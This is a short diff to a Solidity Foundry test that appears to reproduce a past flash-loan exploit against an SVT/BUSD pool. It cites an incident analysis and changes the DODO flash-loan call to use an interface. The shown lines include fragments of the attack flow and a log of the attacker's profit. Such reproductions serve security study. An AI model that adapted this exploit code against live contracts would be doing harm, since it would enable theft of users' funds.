@@ -3,6 +3,9 @@ pragma solidity ^0.8.10;
 
 import "forge-std/Test.sol";
 
+import {IERC20Metadata as IERC20} from "src/interfaces/IERC20Metadata.sol";
+
+import {IDVM} from "src/interfaces/IDVM.sol";
 // @Analysis
 // https://twitter.com/Phalcon_xyz/status/1695285435671392504?s=20
 // @TX
@@ -30,7 +33,7 @@ contract ContractTest is Test {
         BUSD.approve(address(pool), type(uint256).max);
         SVT.approve(address(pool), type(uint256).max);
         uint256 flash_amount = BUSD.balanceOf(dodo);
-        DVM(dodo).flashLoan(0, flash_amount, address(this), new bytes(1));
+        IDVM(dodo).flashLoan(0, flash_amount, address(this), new bytes(1));
 
         emit log_named_decimal_uint("[End] Attacker BUSD balance after exploit", BUSD.balanceOf(address(this)), 18);
     }
